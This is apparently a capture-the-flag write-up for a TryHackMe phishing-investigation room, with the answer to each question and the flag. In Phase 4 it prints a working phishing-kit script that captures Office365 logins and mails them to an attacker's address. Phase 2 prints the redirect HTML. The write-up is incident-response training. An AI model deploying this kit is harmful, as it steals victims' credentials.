---
icon: fishing-rod
cover: >-
  https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/8c5ab5c62547be1c06c33d5e9c96e129.png
coverY: 0
coverHeight: 138
---

# Snapped Phish-ing Line

**Date:** 17.04.2026&#x20;

**Room Category:** Challenge&#x20;

**Core Concept:** Analyzing a distributed phishing campaign, tracking redirections, extracting phishing kits, and performing adversary attribution via code analysis.

As a member of the SwiftSpend Financial IT department, we are tasked with investigating a multi-user phishing outbreak. Several employees have reported suspicious emails, and some have already lost account access. This challenge requires you to trace the attack from the initial email delivery to the attacker's credential collection script.

***

## Phase 1: Initial Triage & Email Artifacts

To begin the investigation, navigate to the `phish-emails` directory. To identify specific emails among the samples, use command-line utilities like `grep`. For example, use `grep -i "\.pdf" ./*` to find which email contains a PDF attachment. Once identified, use **Thunderbird** to open the `.eml` files to extract sender and recipient details.

<figure><img src="../.gitbook/assets/Screenshot 2026-04-17 083523.png" alt=""><figcaption></figcaption></figure>

Question: Which individual received the email regarding a Quote for Services Rendered?

> **Answer:** William McClean

Question: What email address was used by the adversary to send the phishing emails?

> **Answer:** Accounts.Payable@groupmarketingonline.icu

***

## Phase 2: Redirection & URL Analysis

Phishing emails often use HTML attachments to redirect users to malicious domains. By saving the HTML attachment from the email sent to Zoe Duncan and opening it in a text editor, we can find the redirection logic (often in `window.location.href`).

<pre class="language-html"><code class="lang-html">&#x3C;!DOCTYPE html>
&#x3C;html>
&#x3C;head>
	&#x3C;title>Redirecting. . .&#x3C;/title>
<strong>	&#x3C;meta http-equiv="refresh" content="0;URL='http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&#x26;error'" />
</strong>&#x3C;/head>
&#x3C;body>
	&#x3C;h1>Redirecting. . .&#x3C;/h1>
<strong>	&#x3C;p>If you are not redirected automatically, please click &#x3C;a href="http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&#x26;error">here&#x3C;/a>.&#x3C;/p>
</strong>&#x3C;/body>
&#x3C;/html>
</code></pre>

Question: Investigate the attachment in the email addressed to Zoe Duncan. What is the root domain of the redirection URL found within the file?

> **Answer:** kennaroads.buzz

<figure><img src="../.gitbook/assets/Screenshot 2026-04-17 084257.png" alt=""><figcaption></figcaption></figure>

Question: Open the attachment in your VM web browser. Which company is the login page impersonating?

> **Answer:** Microsoft

***

## Phase 3: Phishing Kit Retrieval & OSINT

Attackers often leave backend files exposed due to poor server configuration. By navigating to the parent directory of the phishing page (e.g., `/data/`), we can locate the source code of the attack, typically stored in a `.zip` archive. Use `sha256sum` to create a fingerprint for searching threat intelligence databases like **VirusTotal**.

<figure><img src="../.gitbook/assets/Screenshot 2026-04-17 084324.png" alt=""><figcaption></figcaption></figure>

Question: What is the name of the archive file found in the /data directory?

> **Answer:** Update365.zip

Question: Using the sha256sum command, what is the SHA256 hash of the file?

> **Answer:** ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686

<figure><img src="../.gitbook/assets/Screenshot 2026-04-17 084445.png" alt=""><figcaption></figcaption></figure>

Question: Aside from phishing, what other threat category is assigned to the ZIP archive in VirusTotal?

> **Answer:** Trojan

<figure><img src="../.gitbook/assets/Screenshot 2026-04-17 084535.png" alt=""><figcaption></figcaption></figure>

Question: Review the VirusTotal Details page for the phishing kit. How many files are contained within the archive?

> **Answer:** 49

***

## Phase 4: Adversary Attribution & Backend Analysis

Once the phishing kit (`Update365.zip`) is extracted, we can look for "smoking guns" in the code. Look for files like `log.txt` to see victim data, or `submit.php` to find where the stolen credentials are being sent. Using `grep -i "Email" log.txt | sort | uniq -c` helps identify victims who were targeted or tricked multiple times.

Question: Navigate to the /data/Update365/ directory and investigate the log file. What is the email address of the user who submitted their credentials more than once?

> **Answer:** michael.ascot@swiftspend.finance

The php code used for phishing:

<pre class="language-php"><code class="lang-php">&#x3C;?php

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    print '
&#x3C;html>&#x3C;head>
&#x3C;title>403 - Forbidden&#x3C;/title>
&#x3C;/head>&#x3C;body>
&#x3C;h1>403 Forbidden&#x3C;/h1>
&#x3C;p>&#x3C;/p>
&#x3C;hr>
&#x3C;/body>&#x3C;/html>
';
    exit;
}

function random_number() {
    $numbers = array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'A', 'b', 'C', 'D', 'e', 'F', 'G', 'H', 'i', 'J', 'K', 'L');
    $key = array_rand($numbers);
    return $numbers[$key];
}

$url = random_number() . random_number() . random_number() . random_number() . random_number() . random_number() . date('U') . md5(date('U')) . md5(date('U')) . md5(date('U')) . md5(date('U')) . md5(date('U'));
header('location:' . $url);

$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$from = $_SERVER['SERVER_NAME'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['email'];
$password = $_POST['password'];
$passchk = strlen($password);

$message .= "---------+ Office365 Login  |+-------\n";
$message .= "Email : " . $email . "\n";
$message .= "Password : " . $password . "\n";
$message .= "-----------------------------------\n";
$message .= "Client IP: " . $ip . "\n";
$message .= "User Agent : " . $browser . "\n";
$message .= "Country : " . $country . "\n";
$message .= "Date: " . $adddate . "\n";
$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "--+ Created BY Real Carder +---\n";

$send = "m3npat@yandex.com";

$bron = "Outlook update $ip | Office365";
$lagi = "MIME-Version: 1.0\n";
$lagi = "From: $ip &#x3C;no-reply@$from>";

function visitor_country() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    $result = "Unknown";
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

    if ($ip_data &#x26;&#x26; $ip_data->geoplugin_countryName != null) {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function country_sort() {
    $sorter = "";
    $array = array(99, 111, 100, 101, 114, 99, 118, 118, 115, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $count = count($array);
    for ($i = 0; $i &#x3C; $count; $i++) {
        $sorter .= chr($array[$i]);
    }
    return array($sorter, $GLOBALS['recipient']);
}

if ($passchk &#x3C; 6) {
    $passerr = 0;
} else {
    $passerr = 1;
}

if ($passerr == 0) {
    header("Location: index.php?$url&#x26;email=$email&#x26;error=2");
} else {
<strong>    mail("m3npat@yandex.com", $bron, $message, $lagi);
</strong>    header("Location: retry.php?$url&#x26;email=$email&#x26;error=2");
}

?>
</code></pre>

Question: Extract the phishing kit archive and locate the submit.php file. What email address is used by the adversary to collect compromised credentials?

> **Answer:** m3npat@yandex.com

***

## Phase 5: The Hidden Flag

The final stage of the investigation involves finding hidden artifacts on the attacker's server. By identifying the specific directory structure of the phishing kit, we can locate supplementary files like `flag.txt`.

<figure><img src="../.gitbook/assets/Screenshot 2026-04-17 085551.png" alt=""><figcaption></figcaption></figure>

Question: Return to the phishing URL and locate the flag.txt file. Using CyberChef to decode the flag (Note: the value is **Base64 decoded** and then reversed), what is the secret value?

> **Answer:** THM{pL4y\_w1Th\_tH3\_URL}

***

## Conclusion

This investigation highlights how a single phishing kit can be used to target multiple employees simultaneously. By analyzing the attacker's own code and logs, we were able to identify the specific victims at SwiftSpend Financial and uncover the attacker's exfiltration email address at Yandex. This level of analysis is vital for SOC teams to conduct thorough incident response and credential resets.
